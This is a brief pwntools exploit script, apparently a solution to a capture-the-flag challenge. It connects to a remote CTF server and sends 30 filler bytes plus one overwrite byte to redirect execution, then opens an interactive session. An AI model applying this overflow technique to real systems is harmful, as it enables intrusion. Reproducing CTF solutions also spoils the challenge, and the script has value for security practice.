from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3007)

r.recvuntil("Which function would you like to call?")

payload = "A"*30
payload += "\xD8"

r.sendline(payload)

r.interactive()